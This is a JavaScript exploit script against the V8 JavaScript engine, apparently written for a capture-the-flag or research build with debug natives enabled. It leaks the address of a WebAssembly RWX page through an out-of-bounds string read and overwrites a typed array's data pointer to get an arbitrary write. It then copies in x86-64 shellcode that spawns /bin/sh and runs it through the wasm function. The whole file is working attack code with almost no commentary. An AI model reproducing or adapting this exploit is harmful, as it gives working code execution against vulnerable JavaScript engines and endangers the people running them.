// =====================
// SUBROUTINES
// =====================
function print_debug(x){
    console.log("===============================================");
    %DebugPrint(x);
    console.log("===============================================");
}

function break_point(){
    Math.cosh(1);
}

function leak(buffer, offset){
    let addr1 = 0x0
    let addr2 = 0x0
    for(var i = 0; i < offset+8; i++){
        if(i >= offset && i < offset+4){
            console.log('Leaking byte: '+buffer.charCodeAt(i));
            addr1 += buffer.charCodeAt(i) << (8*i);
        }
        if(i >= offset+4 && i < offset+8){
            console.log('Leaking byte: '+buffer.charCodeAt(i));
            addr2 += buffer.charCodeAt(i) << (8*i);
        }
        else{
            // console.log("["+i+"]"+buffer.charCodeAt(i));
            continue;
        }        
    }
    return [addr2,addr1]
}

function dword_to_qword(buff){
    let msb_l;
    let lsb_l;
    if(buff[1] < 0){
        lsb_l = BigInt(0xffffffff-buff[1]+1);
        if(buff[0] < 0){
            msb_l = BigInt(0xffffffff-buff[0]+1);
            msb_l = BigInt(msb_l) << BigInt(32);
        }
        else{
            msb_l = BigInt(buff[0]);
            msb_l = BigInt(msb_l) << BigInt(32);
        }

    }
    else{
        lsb_l = BigInt(buff[1]);
        if(buff[0] < 0){
            msb_l = BigInt(0xffffffff-buff[0]+1);
            msb_l = BigInt(msb_l) << BigInt(32)
        }
        else{
            msb_l = BigInt(buff[0]);
            msb_l = BigInt(msb_l) << BigInt(32)
        }
    }
    console.log( "MERGE="+(msb_l|lsb_l) );
    return msb_l|lsb_l;
}

// =====================
// EXPLOIT
// =====================
let test = new String("AAAAAAAAAAAAAAAA");
const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x41, 0x00, 0x0b
  ]);
const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
const wasm_func = wasm_instance.exports.a;

print_debug(test);
print_debug(wasm_instance);

// combine 2 4bytes integers into one 8bytes integer
let rwx = leak(test, 0xa30) // 0x454

let rwx_address = dword_to_qword(rwx)
console.log("RWX ADDRESS = "+rwx_address);

break_point() // ================================ Arbitrary LEAK ^


let a1 = new Uint8Array([0]);
let a2 = new Uint8Array([0]);

print_debug(a1);
print_debug(a2);

// buffer to hold data
let to_write = new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])
let tmp_cpy = rwx_address;
for(var i = 8; i < 12; i++){
    to_write[i] = Number(tmp_cpy % BigInt(0x100));
    tmp_cpy /= BigInt(0x100);
}
for(var i = 12; i < 16; i++){
    to_write[i] = 0x0;
}
for(var i = 0; i < 4; i++){
    to_write[i] = 0x0;
}
for(var i = 4; i < 8; i++){
    to_write[i] = Number(tmp_cpy % BigInt(0x100));
    tmp_cpy /= BigInt(0x100);    
}

console.log(to_write);

break_point() 

// overwrite a2's DataPtr (0xcc = 128 (distance between a1 and a2 + 0x28 (offset to DataPtr)))
for(var i = 0; i < 16; i++){
    a1.fill(to_write[i],0xcc+i,0xcc+i+1); 
}

break_point() // ================================ Arbitrary WRITE ^

var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
for (var i = 0; i < shellcode.length; i++) {
    a2.fill(shellcode[i], i, i+1);
}

break_point() // put shellcode in rwx memory ^

wasm_func(); // trigger shell
